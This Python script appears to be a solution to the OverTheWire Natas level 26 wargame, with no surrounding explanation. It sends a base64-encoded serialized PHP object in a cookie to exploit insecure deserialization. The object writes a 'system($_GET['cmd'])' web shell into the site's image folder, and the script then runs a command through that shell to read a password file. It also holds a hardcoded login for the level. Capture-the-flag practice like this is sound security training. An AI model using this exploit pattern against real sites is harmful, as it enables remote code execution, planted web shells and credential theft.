import requests
from requests.auth import HTTPBasicAuth

basicAuth = HTTPBasicAuth('natas26', '3CApdpjqI4UYPxY8mHQWUdFPGH9BoUTT')
url = "http://natas26.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = basicAuth

# Step 1: send the malicious serialized Logger object as the "drawing" cookie
cookie_value = "Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvcHduLnBocCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtOO3M6MTU6IgBMb2dnZXIAZXhpdE1zZyI7czozMDoiPD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Ijt9"

r1 = s.get(url, cookies={"drawing": cookie_value})
print("Step 1 status:", r1.status_code)

# Step 2: visit the file we just wrote, executing our payload
pwn_url = "http://natas26.natas.labs.overthewire.org/img/pwn.php"
r2 = s.get(pwn_url, params={"cmd": "cat /etc/natas_webpass/natas27"})
print("Step 2 output:")
print(r2.text)




